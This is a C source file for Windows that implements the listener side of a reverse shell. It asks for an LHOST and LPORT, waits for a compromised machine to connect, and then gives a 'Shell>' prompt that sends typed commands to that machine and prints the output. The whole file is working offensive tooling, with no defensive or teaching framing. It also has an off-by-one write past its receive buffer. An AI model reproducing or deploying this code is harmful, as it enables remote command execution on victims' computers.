#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>

#pragma comment(lib, "ws2_32.lib")

void main() {
    WSADATA wsa;
    SOCKET server_socket, client_socket;
    struct sockaddr_in server_addr, client_addr;
    int client_len = sizeof(client_addr);
    char *ip;
    int port;

    // Initialize Winsock
    printf("Initializing Winsock...\n");
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("WSAStartup failed. Error code: %d\n", WSAGetLastError());
        return;
    }

    // Prompt for LHOST and LPORT
    printf("ENTER LHOST: ");
    ip = (char *)malloc(16);
    fgets(ip, 16, stdin);
    ip[strcspn(ip, "\n")] = '\0';  // Remove newline character

    printf("ENTER LPORT: ");
    scanf("%d", &port);

    // Create a socket
    if ((server_socket = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        printf("Socket creation failed. Error code: %d\n", WSAGetLastError());
        return;
    }

    // Set up server address structure
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = inet_addr(ip);
    server_addr.sin_port = htons(port);

    // Bind the socket
    if (bind(server_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        printf("Bind failed. Error code: %d\n", WSAGetLastError());
        return;
    }

    // Start listening
    if (listen(server_socket, 3) == SOCKET_ERROR) {
        printf("Listen failed. Error code: %d\n", WSAGetLastError());
        return;
    }

    printf("Listening...\n");

    // Accept a client connection
    if ((client_socket = accept(server_socket, (struct sockaddr *)&client_addr, &client_len)) == INVALID_SOCKET) {
        printf("Accept failed. Error code: %d\n", WSAGetLastError());
        return;
    }

    // Command execution loop
    char buffer[1024];
    int recv_size;
    while (1) {
        memset(buffer, 0, sizeof(buffer));
        printf("Shell> ");
        fgets(buffer, sizeof(buffer), stdin);

        // Send the command to the client
        send(client_socket, buffer, strlen(buffer), 0);

        // Receive the output from the client
        recv_size = recv(client_socket, buffer, sizeof(buffer), 0);
        if (recv_size == SOCKET_ERROR) {
            int error_code = WSAGetLastError();
            if (error_code == WSAECONNRESET) {
                printf("Connection reset by peer. The client may have closed the connection.\n");
            } else {
                printf("Recv failed. Error code: %d\n", error_code);
            }
            break;
        }

        if (recv_size == 0) {
            printf("Client closed the connection.\n");
            break;
        }

        buffer[recv_size] = '\0';
        printf("%s", buffer);
    }

    closesocket(client_socket);
    closesocket(server_socket);
    WSACleanup();
}
